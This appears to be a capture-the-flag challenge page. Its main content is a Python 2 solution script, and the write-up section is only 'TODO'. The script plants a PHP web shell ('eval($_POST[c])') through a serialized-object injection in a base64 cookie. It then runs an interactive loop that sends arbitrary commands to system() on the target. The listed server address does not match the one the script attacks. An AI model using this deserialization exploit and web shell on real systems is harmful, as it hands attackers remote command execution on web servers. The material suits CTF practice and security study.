#### Goals
 * RCE and try to find the flag

#### Server Address
 * http://web.sniperoj.com:10011/

#### Solution
```python
#!/usr/bin/env python

import requests

print "[+] Writing shell to target site..."
url = "http://web2.sniperoj.cn:10007/"
webshell = "http://web2.sniperoj.cn:10007/img/shell.php"

session = requests.Session()

cookies = {
    "drawing":"Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoyNzoiL3Zhci93d3cvaHRtbC9pbWcvc2hlbGwucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MjQ6Ijw/cGhwIGV2YWwoJF9QT1NUW2NdKTs/PiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjI0OiI8P3BocCBldmFsKCRfUE9TVFtjXSk7Pz4iO30=",
}

response = session.get(url, cookies=cookies)

if response.status_code == 500: # ??? Why 500 ???
    print "[+] Web shell uploaded!"
else:
    print "[-] Failed!"
    exit(1)

print "[+] Entering Interactive mode..."

while True:
    command = raw_input("[+] Please input your command : ")
    if command.lower() == "exit":
        break
    data = {
        'c':"system('%s');" % (command),
    }
    response = requests.post(webshell, data = data)
    print "[+] Ok! Result : "
    print response.content
```

#### Writeups
 * TODO

